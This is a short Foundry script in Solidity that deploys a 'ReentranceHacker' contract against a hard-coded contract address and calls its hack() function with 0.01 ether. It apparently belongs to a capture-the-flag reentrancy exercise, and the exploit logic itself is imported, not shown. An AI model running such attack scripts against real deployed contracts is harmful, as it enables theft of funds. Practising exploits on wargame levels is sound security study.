// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";
import {ReentranceHacker} from "../src/ReentranceHacker.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract CounterScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        ReentranceHacker hacker = new ReentranceHacker(0x011F8e6e5529913911bF9C850181FF3eB85e7aB4);
        hacker.hack{value: 0.01 ether}();
        vm.stopBroadcast();
    }
}
